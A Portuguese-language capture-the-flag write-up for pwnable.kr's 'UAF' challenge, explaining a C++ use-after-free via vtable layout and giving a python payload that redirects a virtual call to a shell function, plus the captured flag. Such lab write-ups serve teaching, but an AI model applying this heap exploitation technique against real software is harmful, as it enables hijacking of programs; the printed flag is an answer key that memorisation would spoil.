
# UAF
###### Resolvido por @Cubano2
> Este é um CTF sobre [Use After Free]  

## Sobre o Desafio  

Mommy, what is Use After Free bug?

Running at : nc pwnable.kr 9000

## 🔗 Links do Desafio

- [Exercício](https://pwnable.kr/play.php)

## Solução

O desafio inicia com o acesso à máquina utilizando o seguinte comando:

```
ssh uaf@pwnable.kr -p2222
```

Dentro do terminal da máquina, os seguintes arquivos estão disponíveis:

```
uaf@pwnable:~$ ls
flag  uaf  uaf.cpp
```

Executando o comando `cat uaf.cpp`, é possível visualizar o código-fonte, que, além de apresentar a vulnerabilidade Use-After-Free (UAF), também explora conceitos de Programação Orientada a Objetos:

```c++
#include <fcntl.h>                                           
#include <iostream>                                          
#include <cstring>                                         
#include <cstdlib>                                          
#include <unistd.h>
                                          
using namespace std;

class Human{

private:
        virtual void give_shell(){                                                                                                          
                system("/bin/sh");                                             
        }                                                                                                                                    
protected:                                                                                                                                   
        int age;                                                                                                                             
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};
 
class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};
 
class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};
 
int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);
 
        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;
 
                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
} 
```

Analisando o código, percebe-se que ele possui três funções principais:

- **Opção 1 (use)** → Chama a função `introduce()` para `m` e `w`.

- **Opção 2 (after)** → Aloca memória dinâmica com tamanho definido pelo argumento `argv1` e carrega dados do arquivo especificado em argv2.

- **Opção 3 (free)** → Libera os objetos `m` e `w`.

Descompilando o código no Ghidra, duas funções importantes devem ser analisadas: `introduce()` e `give_shell()`. Pela lógica do código, ao modificar a informação armazenada na opção `use`, é possível fazer com que o ponteiro, que originalmente apontaria para `introduce()`, seja direcionado para `give_shell()`.

Os objetos `m` e `w` estão armazenados em uma vtable. Em C++, as funções virtuais são acessadas através da Virtual Table (vtable), que contém ponteiros para as funções da classe, sendo, neste caso, a classe `Human`.

Variável `man`

![image](https://github.com/user-attachments/assets/d3024548-9134-4a4b-a4f0-79c773755914)

Vtable de `Man`

![image](https://github.com/user-attachments/assets/03428383-0981-41e8-94a9-3f577418a7ab)

Vtable de `human`

![image](https://github.com/user-attachments/assets/604f0582-36b3-4d67-91a5-dd38965ee463)


Quando um objeto chama `introduce()`, ele acessa o endereço armazenado na vtable. Ao analisar a vtable de `Man` no Ghidra, identificam-se os seguintes endereços relevantes:

```
0x401560 → Início da vtable de `Man`
0x401568 → Ponteiro para `Man::typeinfo` (metadados da classe `Man`)
0x401570 → Ponteiro para `Human::give_shell`
0x401578 → Ponteiro para `Man::introduce`
```

Isso significa que a função `give_shell()` já está presente na vtable e pode ser acessada redirecionando o ponteiro corretamente.

Para explorar a vulnerabilidade, é necessário alocar um espaço de memória utilizando a opção `after`, simulando um objeto `Man` real, mas modificando o ponteiro da vtable. Assim, quando a opção `use` for selecionada, o programa executará `give_shell()` em vez de `introduce()`.

O deslocamento entre `give_shell()` e `introduce()` pode ser calculado da seguinte maneira:

```
0x401578 - 0x401570 = 8 bytes
```
Portanto, um ajuste de 8 bytes permite modificar o ponteiro da vtable e fazer com que a execução de `introduce()` chame `give_shell()`.

Para executar o código, é necessário criar um payload com o endereço correto e injetá-lo utilizando a opção `after`.

O seguinte comando gera o payload necessário:

```
python3 -c 'import sys; sys.stdout.buffer.write(b"\x68\x15\x40\x00" + b"\x00" * 4)' > /tmp/uaf-exploit
```

A sequência de comandos para explorar a vulnerabilidade é:

![image](https://github.com/user-attachments/assets/d9e1f927-e39c-4ec7-a0d4-06c0457fd740)

> Assim, obtemos a flag `yay_f1ag_aft3r_pwning`
